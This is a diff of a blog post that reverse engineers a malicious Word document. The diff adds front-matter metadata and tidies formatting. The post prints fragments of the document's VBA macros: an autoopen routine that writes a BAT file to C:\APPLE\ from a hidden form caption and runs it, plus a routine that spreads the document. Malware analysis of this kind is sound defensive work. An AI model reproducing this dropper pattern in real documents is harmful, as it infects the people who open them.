@@ -1,5 +1,7 @@
 ---
 title: Get2092708251.doc
+date:  2020-02-01 12:00:00
+excerpt: "This post attempts to describe the approach to reverse engineering a malicious Microsoft Word document found on *hybrid-analysis.com*."
 ---
 
 This post attempts to describe the approach to reverse engineering a malicious Microsoft Word document found on *hybrid-analysis.com*.
@@ -101,33 +103,26 @@ As shown above, the document contains multiple VBA modules. The following `oledu
 $ python oledump.py -s A12 -v 8a6b7f579788205fa5580aeefc415883998db8cf9d00aae90ce05594a19cc91d.bin
 ```
 
-It was noted that the `Carrow` macro contains two main functions, declared also on the `vbaData.xml` file:
-- `autoopen`
-- `CopyToA`
+It was noted that the `Carrow` macro contains two main functions, declared also on the `vbaData.xml` file: `autoopen` and `CopyToA`.
 
-The `autoopen` macro creates and executes a BAT file on the victim host.
+The `autoopen` macro creates and executes a BAT file on the victim host. <br />
 The `copyToA` macro tries to copy and spread the malicious document across others documents on the victim host.
 
 Specifically, the `autoopen` macro create the `C:\APPLE\2614945622319.BAT` file:
 ```
-[ . . . ]
 lHandle = CreateFileA("C:\APPLE\2614945622319.BAT", GENERIC_WRITE Or GENERIC_READ, _
                          &H2, 0, CREATE_ALWAYS, FILE_SHARE_WRITE, 0)
-[ . . . ]			 
 ```
 
 write something on the `2614945622319.BAT` file created above:
 ```
-[ . . . ]
 Open "C:\APPLE\2614945622319.BAT" For Output As #1
     Print #1, BlueControl.FAQ.Caption
 Close #1
-[ . . . ]
 ```
 
 and execute the `2614945622319.BAT` file:
 ```
-[ . . . ]
 Testing
 End Function
 ```
@@ -160,11 +155,8 @@ Close #1
 ```
 
 The `BlueControl` is a VBA module which contains a Windows Form named `FAQ`. Moreover, the *FAQ* form contains a Windows shell command on its `Caption` property.
-Screenshot:
 
 ![libreoffice]({{ site.url }}/assets/images/posts/reversing-the-get2092708251-maldoc/reversing-the-get2092708251-maldoc-libreoffice.png)
-
-...
 
 Below is shown the Windows shell command found on the *Caption* property of the *BlueControl.FAQ* form:
 
@@ -179,10 +171,6 @@ During the analysis it was noted that the malicious Word document creates the `2
 
 
 ### Stage 2
-
-...
-
-
 
 
 
